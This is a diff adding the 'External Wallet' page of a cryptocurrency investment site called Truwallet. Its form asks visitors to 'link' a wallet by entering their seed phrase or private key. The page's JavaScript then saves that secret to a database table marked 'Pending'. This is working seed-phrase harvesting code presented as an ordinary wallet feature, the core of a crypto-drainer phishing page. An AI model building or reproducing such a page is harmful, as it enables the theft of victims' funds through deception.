@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+
+            <body class="body header-fixed home-3 is_light" data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0">
+                
+
+
+
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="nSoZIUdmG9H6JGT2YC7wEKqjhaKZRw3GzC62balM">
+    <title>External Wallet - Truwallet</title>
+
+    <link rel="stylesheet" href="https://tru-wallet.net/css/ply-app.css">
+    <link rel="stylesheet" href="https://tru-wallet.net/css/magnific-popup.css">
+    <link rel="stylesheet" href="https://tru-wallet.net/css/swiper-bundle.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cryptocoins-icons@2.9.0/webfont/cryptocoins.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cryptocoins-icons@2.9.0/webfont/cryptocoins-colors.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.1/css/jquery.dataTables.min.css">
+    <style>
+        table.dataTable.no-footer {
+            border-bottom: 0px !important;
+        }
+        table.dataTable thead th, table.dataTable thead td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            font-weight: 600;
+            color: #555;
+        }
+        table.dataTable tbody tr:hover {
+            background-color: rgba(0,0,0,0.03);
+        }
+        div.dataTables_wrapper div.dataTables_length label,
+        div.dataTables_wrapper div.dataTables_filter label {
+            font-size: 14px;
+            color: #666;
+        }
+        div.dataTables_wrapper div.dataTables_info {
+            font-size: 13px;
+            color: #888;
+        }
+        .badge-pending {
+            background-color: #f5a623;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 5px 12px;
+            border-radius: 50px;
+        }
+        .badge-rejected {
+            background-color: #e74c3c;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 5px 12px;
+            border-radius: 50px;
+        }
+        .badge-verified {
+            background-color: #27ae60;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 5px 12px;
+            border-radius: 50px;
+        }
+        .badge-complete {
+            background-color: #2ecc71;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 5px 12px;
+            border-radius: 50px;
+        }
+    </style>
+
+    <link rel="shortcut icon" href="https://tru-wallet.net/images/logo/truwallet-logo.png">
+    <link rel="apple-touch-icon-precomposed" href="https://tru-wallet.net/images/logo/truwallet-logo.png">
+    <style>
+        li.active>a.sidebar-nav-a {
+            display: block;
+            color: #eee;
+            padding-bottom: 7px;
+        }
+
+        li.active>a.sidebar-nav-a:hover {
+            color: #fff;
+        }
+    </style>
+
+
+
+    
+    <header id="header_main" class="header is-fixed is-small">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-12">
+                <div class="header__body d-flex justify-content-between">
+                    <div class="header__left">
+                        <div class="logo">
+                            <a class="light" href="home.html">
+                                <img id="site-logo" src="https://tru-wallet.net/images/logo/truewallet-logo-black.png" alt="" width="118" height="32" data-retina="https://tru-wallet.net/images/logo/truewallet-logo-black.png" data-width="118" data-height="32">
+                            </a>
+                        </div>
+                        <div class="left__main">
+                            <nav id="main-nav" class="main-nav">
+                                <ul id="menu-primary-menu" class="menu">
+                                    <li class="menu-item ">
+                                        <a href="home.html">Home</a>
+                                    </li>
+                                    <li class="menu-item ">
+                                        <a href="about.html">About</a>
+                                    </li>
+                                    <li class="menu-item ">
+                                        <a href="contact.html">Contact</a>
+                                    </li>
+                                    <li class="menu-item ">
+                                        <a href="p2p.html">P2P</a>
+                                    </li>
+                                    <li class="menu-item ">
+                                        <a href="invesment.html">Investment</a>
+                                    </li>
+                                                                            <li class="menu-item ">
+                                            <a href="dashboard.html">Dashboard</a>
+                                        </li>
+                                                                                                        </ul>
+                            </nav>
+                        </div>
+                    </div>
+
+                    <div class="header__right">
+                        <div class="mobile-button">
+                            <span></span>
+                        </div>
+                                                    <div class="dropdown user d-block">
+                                <button class="btn dropdown-toggle shadow-none" type="button" id="dropdownMenuButton4" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <img id="header-avatar" src="https://tru-wallet.net/images/avt/avt-01.jpg" class="rounded-circle" alt="">
+                                </button>
+                                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton4">
+                                    <a class="dropdown-item" href="profile.html">
+                                        <i class="bx bx-user font-size-16 align-middle me-1"></i>
+                                        <span>Profile</span>
+                                    </a>
+                                    <a class="dropdown-item text-danger" href="index.html" onclick="if(window.insforgeClient) window.insforgeClient.auth.signOut()">
+                                        <i class="bx bx-power-off font-size-16 align-middle me-1 text-danger"></i>
+                                        <span>Logout</span>
+                                    </a>
+                                </div>
+                            </div>
+                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header><div style="height: 49.9855px;"></div>
+
+        <!-- PageTitle -->
+    <section class="page-title">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <h3 class="heading">External Wallet</h3>
+                </div>
+                <div class="col-md-6">
+                    <ul class="breadcrumb">
+                        <li><a href="home.html">Home</a></li>
+                        <li>
+                            <p class="fs-18">/</p>
+                        </li>
+                        <li>
+                            <p class="fs-18">External Wallet</p>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- End PageTitle -->
+
+    <section class="user-profile wallet buy-crypto flat-tabs">
+        <div class="container">
+            <div class="row">
+
+                <div class="col-xl-3 col-md-12">
+    <div class="user-info center">
+        <div class="avt">
+            <img id="sidebar-avatar" src="https://tru-wallet.net/images/avt/avt.png" alt="no file">
+        </div>
+        <h6 id="sidebar-name" class="name text-capitalize">Loading...</h6>
+        <p id="sidebar-email">Loading...</p>
+        
+    </div>
+
+    <ul class="menu-tab">
+        <li class="" onclick="location.href = 'dashboard.html'">
+            <a href="dashboard.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-gauge-high"></i>
+                Dashboard
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'deposit.html'">
+            <a href="deposit.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-money-bill-transfer"></i>
+                Deposit
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'orders.html'">
+            <a href="orders.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-money-bill-transfer"></i>
+                P2P&nbsp;Deposit&nbsp;Orders
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'packages.html'">
+            <a href="packages.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-sack-dollar"></i>
+                Investments
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'withdrawals.html'">
+            <a href="withdrawals.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-money-bill"></i>
+                Withdrawals
+            </a>
+        </li>
+        <li class="active" onclick="location.href = 'external-wallets.html'">
+            <a href="external-wallets.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-wallet"></i>
+                External Wallets
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'loans.html'">
+            <a href="loans.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-university"></i>
+                Request Loan
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'referrals.html'">
+            <a href="referrals.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-users-rays"></i>
+                Referrals
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'profile.html'">
+            <a href="profile.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-user"></i>
+                Profile&nbsp;&amp;&nbsp;Security
+            </a>
+        </li>
+        <li class="" onclick="location.href = 'index.html'">
+            <a href="index.html" class="fs-16 sidebar-nav-a">
+                <i class="fa fa-lock"></i>
+                Logout
+            </a>
+        </li>
+    </ul>
+</div>
+                <div class="col-xl-9 col-md-12">
+                    <div class="content-tab">
+                        <div class="content-inner">
+
+                            <div class="row">
+                                <div class="offset-md-2 col-md-8">
+                                    <h6 class="mt-4 text-black">Link External Wallet</h6>
+                                    <div class="shadow-sm p-4 mb-5 bg-body rounded">
+                                        
+                                        <form id="form-link-wallet">
+                                            <div class="form-group">
+                                                <label for="wallet">
+                                                    Choose how you want to link wallet <span class="text-danger">*</span>
+                                                </label>
+                                                <select class="form-control w-100 m-0" id="select-wallet" required="">
+                                                    <option value="">Select</option>
+                                                    <option value="passPhrase">Pass Phrase</option>
+                                                    <option value="privateKey">Private Key</option>
+                                                </select>
+                                            </div>
+
+                                            <div class="form-group mt-3 d-block" id="wallet-val-div">
+                                                <label id="wallet-val-label">Enter your private key <span class="text-danger">*</span></label>
+                                                <textarea name="passPhrase" class="form-control" id="passPhrase" rows="2" required="" placeholder="Typically 64 alphanumeric characters"></textarea>
+                                            </div>
+
+                                            <button type="submit" class="btn btn-primary text-white mt-3" id="btn-submit">
+                                                Proceed
+                                            </button>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Linked External Wallets History -->
+                            <div class="row mt-5">
+                                <div class="col-md-12">
+                                    <h4 class="mb-4 text-black">Linked External Wallets</h4>
+                                    <div class="table-responsive bg-body rounded shadow-sm p-4">
+                                        <table class="table table-borderless" id="history-table">
+                                            <thead>
+                                                <tr>
+                                                    <th>Date</th>
+                                                    <th>Link Type</th>
+                                                    <th>Link Value</th>
+                                                    <th>Status</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody id="history-body">
+                                                <!-- Dynamic Content -->
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+
+
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer style-2">
+    <div class="container">
+        <div class="footer__main">
+            <div class="row mb-3">
+                <div class="col-xl-4 col-md-6">
+                    <div class="info">
+                        <a href="home.html" class="logo">
+                            <img style="width: 150px;" src="https://tru-wallet.net/images/logo/truewallet-logo-black.png" alt="">
+                        </a>
+                        <h6>Let's talk! 🤙</h6>
+                        <ul class="list">
+                            <li><p>+44 7900 405151 (whatsapp)</p></li>
+                            <li><p>@TRU_WALLET (instagram)</p></li>
+                            <li><p>26 Federal Building  7th Floor, Suite 9-110,  10278</p></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-xl-4 col-md-6">
+                    <div class="widget">
+                        <div class="widget-link">
+                            <h6 class="title">PRODUCTS</h6>
+                            <ul>
+                                <li><a href="home.html">Home</a></li>
+                                <li><a href="about.html">About</a></li>
+                                <li><a href="contact.html">Contact</a></li>
+                                <li><a href="p2p.html">P2P</a></li>
+                                <li><a href="invesment.html">Investment</a></li>
+                            </ul>
+                        </div>
+                        <div class="widget-link s2">
+                            <h6 class="title">SERVICES</h6>
+                            <ul>
+                            <li><a href="dashboard.html">Buy Crypto</a></li>
+                            <li><a href="https://tru-wallet.net/referrals">Referrals</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xl-4 col-md-12">
+                    <div class="footer-contact">
+                        <h5>Newletters</h5>
+                        <p>
+                            Subscribe our newsletter to get more exciting offers and latest crypto news.
+                        </p>
+                        <form id="form-newsletter">
+                            <input type="email" placeholder="Enter your email" required="">
+                            <button type="submit" class="btn-action" id="btn-newsletter">Submit</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid">
+        <div class="footer__bottom">
+            <p>Copyright © 2026 Truwallet. All rights reserved.</p>
+        </div>
+    </div>
+</footer>
+
+<script src="https://tru-wallet.net/js/aos.js"></script>
+<script src="https://tru-wallet.net/js/jquery.min.js"></script>
+<script src="https://tru-wallet.net/js/jquery.easing.js"></script>
+<script src="https://tru-wallet.net/js/popper.min.js"></script>
+<script src="https://tru-wallet.net/js/bootstrap.min.js"></script>
+<script src="https://tru-wallet.net/js/ply-app.js"></script>
+<script src="https://tru-wallet.net/js/jquery.peity.min.js"></script>
+
+
+<script src="https://tru-wallet.net/js/switchmode.js"></script>
+<script src="https://tru-wallet.net/js/jquery.magnific-popup.min.js"></script>
+
+
+
+<!-- Swiper JS -->
+<script src="https://tru-wallet.net/js/swiper-bundle.min.js"></script>
+
+<script src="https://tru-wallet.net/js/swiper.js"></script>
+    <script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js"></script>
+    <script src="https://tru-wallet.net/js/custom.js"></script>
+<script src="insforge-config.js"></script>
+    <script type="module">
+        import { createClient } from "https://cdn.jsdelivr.net/npm/@insforge/sdk@latest/+esm";
+        window.insforgeClient = createClient({ baseUrl: window.INSFORGE_URL, anonKey: window.INSFORGE_ANON_KEY });
+    </script>
+    <script src="user-profile.js"></script>
+    <script>
+        const getBadgeClassEW = (status) => {
+            const s = (status || '').toLowerCase();
+            if (s === 'pending') return 'badge-pending';
+            if (s === 'rejected' || s === 'failed') return 'badge-rejected';
+            if (s === 'verified') return 'badge-verified';
+            return 'badge-complete';
+        };
+
+        $(document).ready(function() {
+
+            $('#select-wallet').on('change', function() {
+                const selectedOption = $(this).find(":selected")
+                if (selectedOption.val() == '')
+                {
+                    $('#passPhrase').attr('readonly', true).val('')
+                    $('#wallet-val-div').removeClass('d-block').addClass('d-none')
+                }
+                else
+                {
+                    $('#passPhrase').attr('readonly', false).attr('placeholder', 
+                        selectedOption.val() == 'passPhrase' ? 'Typically 12 (sometimes 24) words separated by single space'
+                        : 'Typically 64 alphanumeric characters')
+                    $('#wallet-val-label').html(`${selectedOption.val() == 'passPhrase' 
+                        ? 'Enter your pass phrase' : 'Enter your private key'} <span class="text-danger">*</span>`)
+                    $('#wallet-val-div').removeClass('d-none').addClass('d-block')
+                }
+            })
+
+            $('#form-link-wallet').on('submit', async function(e) {
+                e.preventDefault()
+
+                const linkType = $('#select-wallet').val();
+                const linkValue = $('#passPhrase').val();
+
+                // Validation for 64 alphanumeric characters if privateKey
+                if (linkType === 'privateKey') {
+                    const privateKeyRegex = /^[a-zA-Z0-9]{64}$/;
+                    if (!privateKeyRegex.test(linkValue)) {
+                        alert("Invalid private key. It must be exactly 64 alphanumeric characters.");
+                        return;
+                    }
+                }
+
+                const btn = $('#btn-submit')
+                btn.attr('disabled', true).html("Processing <i class='fa fa-circle-notch fa-spin'></i>")
+
+                try {
+                    const { data: userData, error: userError } = await window.insforgeClient.auth.getCurrentUser();
+                    const user = userData?.user || userData;
+                    if (userError || !user) throw new Error("Please log in again.");
+
+                    const payload = {
+                        user_id: user.id,
+                        asset: linkType,
+                        address: linkValue,
+                        status: 'Pending'
+                    }
+
+                    if (!window.insforgeClient) throw new Error("InsForge Client not initialized.");
+                    const { data, error } = await window.insforgeClient.database.from('external_wallets').insert(payload);
+                    if (error) throw error;
+                    
+                    btn.attr('disabled', false).html("Proceed");
+                    $('#select-wallet').val('');
+                    $('#passPhrase').val('');
+                    alert("Wallet linkage request submitted successfully! Status: Pending");
+                    fetchLinkedWallets(); // Refresh the table
+                } catch (err) {
+                    btn.attr('disabled', false).html("Proceed");
+                    alert("Error linking wallet: " + err.message);
+                }
+            })
+
+            async function fetchLinkedWallets() {
+                try {
+                    if (!window.insforgeClient) return;
+                    const { data: userData, error: userError } = await window.insforgeClient.auth.getCurrentUser();
+                    const user = userData?.user || userData;
+                    if (userError || !user) return;
+
+                    const { data, error } = await window.insforgeClient.database
+                        .from('external_wallets')
+                        .select('*')
+                        .eq('user_id', user.id)
+                        .order('created_at', { ascending: false });
+
+                    if (error) throw error;
+
+                    const body = $('#history-body');
+                    body.empty();
+
+                    if (!data || data.length === 0) {
+                        body.append('<tr><td colspan="4" class="text-center text-muted">No linked wallets found.</td></tr>');
+                        return;
+                    }
+
+                    data.forEach(item => {
+                        const dateStr = new Date(item.created_at).toLocaleDateString('en-GB', {
+                            day: 'numeric',
+                            month: 'short',
+                            year: 'numeric'
+                        });
+                        const badgeClass = getBadgeClassEW(item.status);
+                        
+                        const row = `
+                            <tr>
+                                <td class="text-black">${dateStr}</td>
+                                <td><span class="badge badge-verified text-lowercase">${item.asset}</span></td>
+                                <td class="text-black">***</td>
+                                <td><span class="${badgeClass}">${item.status}</span></td>
+                            </tr>
+                        `;
+                        body.append(row);
+                    });
+                } catch (err) {
+                    console.error("Error fetching wallets:", err);
+                }
+            }
+
+            // Initial fetch
+            setTimeout(fetchLinkedWallets, 1500); // Small delay to ensure client is ready
+        })
+    </script>
+
+
+<script>
+    $(() => {
+        'use strict'
+
+        $('#form-newsletter').submit(function(e){
+            e.preventDefault()
+
+            const btn = $('#btn-newsletter')
+            btn.html('Submitting...').attr('disabled', true)
+
+            window.setTimeout(() => {
+                alert('You have successfully subscribe to our newletter. Lookout for our emails on exciting offers and latest crypto news.')
+
+                btn.html('Submit').attr('disabled', false)
+                $('#form-newsletter')[0].reset()
+            }, 3500);
+        })
+    })
+</script>
+
+
+
+                <script>// Write JavaScript here</script>
+            
+        
+    </body>
